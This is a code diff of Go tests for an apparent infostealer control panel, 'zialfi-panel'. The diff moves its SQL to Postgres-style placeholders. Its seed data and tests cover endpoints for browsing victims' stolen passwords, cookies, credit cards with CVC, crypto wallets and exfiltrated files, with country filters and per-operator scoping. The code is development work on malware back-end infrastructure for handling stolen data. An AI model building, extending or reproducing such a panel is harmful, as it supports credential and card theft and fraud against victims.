@@ -9,10 +9,10 @@ import (
 
 	"zialfi-panel/internal/api"
 	"zialfi-panel/internal/auth"
-	"zialfi-panel/internal/db"
 
 	"github.com/go-chi/chi/v5"
 	"github.com/google/uuid"
+	"zialfi-panel/internal/testutil"
 )
 
 type dataEnvelope struct {
@@ -28,37 +28,37 @@ func seedDataRow(t *testing.T, d *sql.DB, sessionID, ownerID string) {
 	t.Helper()
 	if _, err := d.Exec(
 		`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, created_at)
-		 VALUES (?, 'b', 'h', 'win', 'u', '1.2.3.4', 'US', ?, datetime('now'))`,
+		 VALUES ($1, 'b', 'h', 'win', 'u', '1.2.3.4', 'US', $2, CURRENT_TIMESTAMP)`,
 		sessionID, ownerID,
 	); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := d.Exec(
-		`INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES (?, ?, ?, ?, ?, ?)`,
+		`INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES ($1, $2, $3, $4, $5, $6)`,
 		"p-"+sessionID, sessionID, "https://example.com/login", "alice", "hunter2", "chrome",
 	); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := d.Exec(
-		`INSERT INTO cookies (id, session_id, domain, name, value, path) VALUES (?, ?, ?, ?, ?, ?)`,
+		`INSERT INTO cookies (id, session_id, domain, name, value, path) VALUES ($1, $2, $3, $4, $5, $6)`,
 		"ck-"+sessionID, sessionID, ".example.com", "session", "abc123", "/",
 	); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := d.Exec(
-		`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc) VALUES (?, ?, ?, ?, ?, ?, ?)`,
+		`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc) VALUES ($1, $2, $3, $4, $5, $6, $7)`,
 		"cd-"+sessionID, sessionID, "4532015112830366", "12", "2028", "ALICE DOE", "123",
 	); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := d.Exec(
-		`INSERT INTO wallets (id, session_id, name, path) VALUES (?, ?, ?, ?)`,
+		`INSERT INTO wallets (id, session_id, name, path) VALUES ($1, $2, $3, $4)`,
 		"w-"+sessionID, sessionID, "MetaMask", "C:\\Users\\alice\\AppData\\Roaming\\MetaMask",
 	); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := d.Exec(
-		`INSERT INTO stolen_files (id, session_id, filename, size) VALUES (?, ?, ?, ?)`,
+		`INSERT INTO stolen_files (id, session_id, filename, size) VALUES ($1, $2, $3, $4)`,
 		"f-"+sessionID, sessionID, "passwords.txt", 2048,
 	); err != nil {
 		t.Fatal(err)
@@ -83,7 +83,7 @@ func dataGet(t *testing.T, r http.Handler, token, url string) (int, dataEnvelope
 }
 
 func TestData_Passwords_HappyPath(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	sid := uuid.New().String()
 	seedDataRow(t, d, sid, "")
@@ -111,7 +111,7 @@ func TestData_Passwords_HappyPath(t *testing.T) {
 }
 
 func TestData_Cookies_HappyPath(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	sid := uuid.New().String()
 	seedDataRow(t, d, sid, "")
@@ -130,7 +130,7 @@ func TestData_Cookies_HappyPath(t *testing.T) {
 }
 
 func TestData_Cards_HappyPath(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	sid := uuid.New().String()
 	seedDataRow(t, d, sid, "")
@@ -152,7 +152,7 @@ func TestData_Cards_HappyPath(t *testing.T) {
 }
 
 func TestData_Wallets_HappyPath(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	sid := uuid.New().String()
 	seedDataRow(t, d, sid, "")
@@ -167,7 +167,7 @@ func TestData_Wallets_HappyPath(t *testing.T) {
 }
 
 func TestData_Files_HappyPath(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	sid := uuid.New().String()
 	seedDataRow(t, d, sid, "")
@@ -185,7 +185,7 @@ func TestData_Files_HappyPath(t *testing.T) {
 }
 
 func TestData_Search(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	seedDataRow(t, d, uuid.New().String(), "")
 	seedDataRow(t, d, uuid.New().String(), "")
@@ -208,7 +208,7 @@ func TestData_Search(t *testing.T) {
 }
 
 func TestData_CountryFilter(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	seedDataRow(t, d, uuid.New().String(), "")
 
@@ -230,7 +230,7 @@ func TestData_CountryFilter(t *testing.T) {
 }
 
 func TestData_Pagination(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	for i := 0; i < 3; i++ {
 		seedDataRow(t, d, uuid.New().String(), "")
@@ -254,7 +254,7 @@ func TestData_Pagination(t *testing.T) {
 }
 
 func TestData_UnknownType(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	req := httptest.NewRequest(http.MethodGet, "/api/data/bogus", nil)
 	req.Header.Set("Authorization", "Bearer "+token)
@@ -266,7 +266,7 @@ func TestData_UnknownType(t *testing.T) {
 }
 
 func TestData_RequiresAuth(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, _, _ := setupE2ETestRouter(t, d, nil)
 	req := httptest.NewRequest(http.MethodGet, "/api/data/passwords", nil)
 	w := httptest.NewRecorder()
@@ -277,9 +277,9 @@ func TestData_RequiresAuth(t *testing.T) {
 }
 
 func TestData_TenantScope_NonAdminSeesOwnOnly(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r := chi.NewRouter()
-	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)
+	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, nil)
 
 	userA := createTestUserWithRole(t, d, "usera", "pw", "user")
 	userB := createTestUserWithRole(t, d, "userb", "pw", "user")
@@ -287,7 +287,7 @@ func TestData_TenantScope_NonAdminSeesOwnOnly(t *testing.T) {
 	seedDataRow(t, d, uuid.New().String(), userA)
 	seedDataRow(t, d, uuid.New().String(), userB)
 
-	tokenA, _, err := auth.GenerateToken(userA, "user", "test-secret", "")
+	tokenA, _, err := auth.GenerateToken(userA, "user", "test-secret", "", 0)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -302,16 +302,16 @@ func TestData_TenantScope_NonAdminSeesOwnOnly(t *testing.T) {
 }
 
 func TestData_AdminSeesAll(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r := chi.NewRouter()
-	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)
+	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, nil)
 
 	userA := createTestUserWithRole(t, d, "usera", "pw", "user")
 	adminID := createTestUserWithRole(t, d, "root", "pw", "admin")
 
 	seedDataRow(t, d, uuid.New().String(), userA)
 
-	token, _, err := auth.GenerateToken(adminID, "admin", "test-secret", "")
+	token, _, err := auth.GenerateToken(adminID, "admin", "test-secret", "", 0)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -325,7 +325,7 @@ func TestData_AdminSeesAll(t *testing.T) {
 }
 
 func TestData_Sort(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token, _ := setupE2ETestRouter(t, d, nil)
 	seedDataRow(t, d, uuid.New().String(), "")
 	seedDataRow(t, d, uuid.New().String(), "")
